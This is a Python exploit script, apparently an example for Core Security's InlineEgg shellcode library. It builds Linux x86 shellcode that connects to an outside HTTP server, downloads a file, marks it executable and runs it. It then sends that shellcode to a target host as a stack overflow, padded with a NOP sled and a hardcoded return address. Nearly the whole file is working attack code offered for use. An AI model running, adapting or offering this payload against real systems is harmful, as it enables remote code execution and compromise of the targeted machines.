#!/usr/bin/python
#--
# Copyright (c) 2002,2003 Core Security Technologies, Core SDI Inc.
# All rights reserved.
#
#    Unless you have express writen permission from the Copyright Holder, any
# use of or distribution of this software or portions of it, including, but not
# limited to, reimplementations, modifications and derived work of it, in
# either source code or any other form, as well as any other software using or
# referencing it in any way, may NOT be sold for commercial gain, must be
# covered by this very same license, and must retain this copyright notice and
# this license.
#    Neither the name of the Copyright Holder nor the names of its contributors
# may be used to endorse or promote products derived from this software
# without specific prior written permission.
#
# THERE IS NO WARRANTY FOR THE SOFTWARE, TO THE EXTENT PERMITTED BY APPLICABLE
# LAW. EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR
# OTHER PARTIES PROVIDE THE SOFTWARE "AS IS" WITHOUT WARRANTY OF ANY KIND,
# EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE. THE
# ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE SOFTWARE IS WITH YOU.
# SHOULD THE SOFTWARE PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY
# SERVICING, REPAIR OR CORRECTION.
#
# IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL
# ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR REDISTRIBUTE
# THE SOFTWARE AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
# GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE
# OR INABILITY TO USE THE SOFTWARE (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR
# DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR
# A FAILURE OF THE SOFTWARE TO OPERATE WITH ANY OTHER SOFTWARE), EVEN IF SUCH
# HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.
#
# gera [at corest.com]
#--

from inlineegg.inlineegg import *
import socket
import sys
import os

def getAndExecuteEgg(peer, file):
   """ This egg is a reimplementation of an old idea, lately refreshed by zillion
   it will download a file from a webserver, save it to disk, and execute it"""
   # egg = InlineEgg(FreeBSDx86Syscall)
   # egg = InlineEgg(OpenBSDx86Syscall)
   egg = InlineEgg(Linuxx86Syscall)

   s = egg.socket(socket.AF_INET, socket.SOCK_STREAM)
   s = egg.save(s)
   egg.connect(s,peer)
   request = 'GET %s HTTP/1.0\r\n\r\n' % file
   egg.write(s,request,len(request))
   fileName = egg.save('.exe')
   f = egg.open(fileName.addr(),os.O_RDWR | os.O_TRUNC | os.O_CREAT, 0755)
   f = egg.save(f)

   # skip up to content
   upToCrLf = egg.Do()
   buf = upToCrLf.save('1')
   
   upToCr   = upToCrLf.Do()
   upToCr.read(s,buf.addr(),1)
   upToCr.While(buf,'!=',13)

   upToCrLf.read(s,buf.addr(),3)
   upToCrLf.While(buf,'!=',0x0a0d0a)

   buf = egg.save('eax')
   
   copy = egg.Do()
   r = copy.read(s, buf.addr(), 4)
   w = copy.write(f,buf.addr(), r)
   copy.While(w, '!=', 0)
   egg.close(s)
   egg.close(f)
   egg.execve(fileName.addr(),(fileName.addr(),))

   return egg

def main():
   if len(sys.argv) < 6:
      raise Exception, "Usage: %s <target ip> <target port> <http server ip> <http server port> <file to download>"

   # create egg
   egg = getAndExecuteEgg((sys.argv[3],int(sys.argv[4])), sys.argv[5])

   # connect to target
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   sock.connect((sys.argv[1], int(sys.argv[2])))

   # exploit
   retAddr = struct.pack('<L',0xbffffc24L)
   toSend  = ''
   toSend += "\x90"*(1024-len(egg))
   toSend += egg.getCode()
   toSend += retAddr*20

   sock.send(toSend)

main()

